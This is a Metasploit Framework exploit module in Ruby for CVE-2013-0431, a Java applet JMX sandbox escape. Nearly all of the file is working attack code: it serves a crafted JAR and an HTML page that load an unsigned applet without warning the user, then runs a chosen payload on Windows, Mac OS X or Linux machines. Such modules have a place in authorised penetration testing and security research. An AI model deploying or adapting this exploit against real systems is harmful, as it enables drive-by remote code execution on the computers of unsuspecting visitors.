##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require 'msf/core'
require 'rex'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
    include Msf::Exploit::EXE
 
    include Msf::Exploit::Remote::BrowserAutopwn
    autopwn_info({ :javascript => false })
 
    def initialize( info = {} )
 
        super( update_info( info,
            'Name'          => 'Java Applet JMX Remote Code Execution',
            'Description'   => %q{
                    This module abuses the JMX classes from a Java Applet to run arbitrary Java code
                outside of the sandbox as exploited in the wild in February of 2013. Additionally,
                this module bypasses default security settings introduced in Java 7 Update 10 to run
                unsigned applet without displaying any warning to the user.
            },
            'License'       => MSF_LICENSE,
            'Author'        =>
                [
                    'Unknown', # Vulnerability discovery and exploit in the wild
                    'Adam Gowdiak', # Vulnerability discovery
                    'SecurityObscurity', # Exploit analysis and deobfuscation
                    'juan vazquez' # Metasploit module
                ],
            'References'    =>
                [
                    [ 'CVE', '2013-0431' ],
                    [ 'OSVDB', '89613' ],
                    [ 'BID', '57726' ],
                    [ 'URL', 'http://www.security-explorations.com/materials/SE-2012-01-ORACLE-8.pdf' ],
                    [ 'URL', 'http://www.security-explorations.com/materials/SE-2012-01-ORACLE-9.pdf' ],
                    [ 'URL', 'http://security-obscurity.blogspot.com.es/2013/01/about-new-java-0-day-vulnerability.html' ],
                    [ 'URL', 'http://pastebin.com/QWU1rqjf' ],
                    [ 'URL', 'http://malware.dontneedcoffee.com/2013/02/cve-2013-0431-java-17-update-11.html' ]
                ],
            'Platform'      => [ 'java', 'win', 'osx', 'linux' ],
            'Payload'       => { 'Space' => 20480, 'BadChars' => '', 'DisableNops' => true },
            'Targets'       =>
                [
                    [ 'Generic (Java Payload)',
                        {
                            'Platform' => ['java'],
                            'Arch' => ARCH_JAVA,
                        }
                    ],
                    [ 'Windows x86 (Native Payload)',
                        {
                            'Platform' => 'win',
                            'Arch' => ARCH_X86,
                        }
                    ],
                    [ 'Mac OS X x86 (Native Payload)',
                        {
                            'Platform' => 'osx',
                            'Arch' => ARCH_X86,
                        }
                    ],
                    [ 'Linux x86 (Native Payload)',
                        {
                            'Platform' => 'linux',
                            'Arch' => ARCH_X86,
                        }
                    ],
                ],
            'DefaultTarget'  => 0,
            'DisclosureDate' => 'Jan 19 2013'
        ))
    end
 
    def on_request_uri(cli, request)
        print_status("handling request for #{request.uri}")
 
        case request.uri
        when /\.jar$/i
            print_status("Sending JAR")
            send_response( cli, generate_jar, { 'Content-Type' => "application/octet-stream" } )
        when /\/$/
            print_status("Sending HTML")
            send_response_html(cli, generate_html, { 'Content-Type' => 'text/html' })
        else
            send_redirect(cli, get_resource() + '/', '')
        end
    end
 
    def generate_jar
        paths = [
            [ "Exploit.ser" ],
            [ "Exploit.class" ],
            [ "B.class" ]
        ]
 
        p = regenerate_payload(cli)
 
        jar  = p.encoded_jar
 
        paths.each do |path|
            1.upto(path.length - 1) do |idx|
                full = path[0,idx].join("/") + "/"
                if !(jar.entries.map{|e|e.name}.include?(full))
                    jar.add_file(full, '')
                end
            end
            fd = File.open(File.join( Msf::Config.install_root, "data", "exploits", "cve-2013-0431", path ), "rb")
            data = fd.read(fd.stat.size)
            jar.add_file(path.join("/"), data)
            fd.close
        end
        return  jar.pack
    end
 
    def generate_html
        html = <<-EOF
<html>
<script language="Javascript">
 
var _app = navigator.appName;
 
if (_app == 'Microsoft Internet Explorer') {
document.write('<applet archive="#{rand_text_alpha(4+rand(4))}.jar" object="Exploit.ser"></applet>');
} else {
document.write('<embed object="Exploit.ser" type="application/x-java-applet;version=1.6" archive="#{rand_text_alpha(4+rand(4))}.jar"></embed>');
}
 
</script>
</html>
        EOF
        return html
    end
 
end
